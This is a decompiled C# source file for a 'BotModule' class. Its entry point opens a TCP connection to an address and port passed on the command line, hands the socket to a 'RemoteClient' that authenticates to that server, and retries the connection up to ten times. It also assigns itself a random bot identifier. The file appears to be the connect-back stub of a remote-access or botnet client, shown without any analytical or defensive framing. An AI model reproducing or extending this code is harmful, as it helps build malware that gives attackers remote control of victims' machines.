using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using RemoteClient;
using RemoteClient.Polices;
using RemoteClient.Schemes;

namespace EnteryNameSpace
{
	// Token: 0x02000008 RID: 8
	public static class BotModule
	{
		// Token: 0x06000009 RID: 9 RVA: 0x00002958 File Offset: 0x00000B58
		public static void EnteryPoint(string[] Args)
		{
			int num = 0;
			for (;;)
			{
				if (num < 10)
				{
					goto IL_A3;
				}
				bool flag = false;
				IL_0B:
				if (flag)
				{
					try
					{
						BotModule._Args = Args;
						Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
						socket.Connect(new IPEndPoint(IPAddress.Parse(BotModule._Args[1].Split(new char[]
						{
							':'
						})[0]), Convert.ToInt32(BotModule._Args[1].Split(new char[]
						{
							':'
						})[1])));
						Product.tests = new RemoteClient(socket);
						Product.tests.Auth();
						while (Product.tests.clientState)
						{
							Thread.Sleep(1000);
						}
						Thread.Sleep(5000);
						goto IL_AD;
					}
					catch
					{
						goto IL_AD;
					}
					goto IL_A3;
					IL_AD:
					num++;
					continue;
				}
				break;
				IL_A3:
				flag = BotModule.needReconnect;
				goto IL_0B;
			}
		}

		// Token: 0x0600000A RID: 10 RVA: 0x0000226C File Offset: 0x0000046C
		// Note: this type is marked as 'beforefieldinit'.
		static BotModule()
		{
			InvocationProcessPolicy.CompareError();
			BotModule.needReconnect = true;
			BotModule.id = Encoding.ASCII.GetBytes(Path.GetRandomFileName() + Path.GetRandomFileName());
		}

		// Token: 0x0400001C RID: 28
		public static bool needReconnect;

		// Token: 0x0400001D RID: 29
		public static string[] _Args;

		// Token: 0x0400001E RID: 30
		public static byte[] id;
	}
}
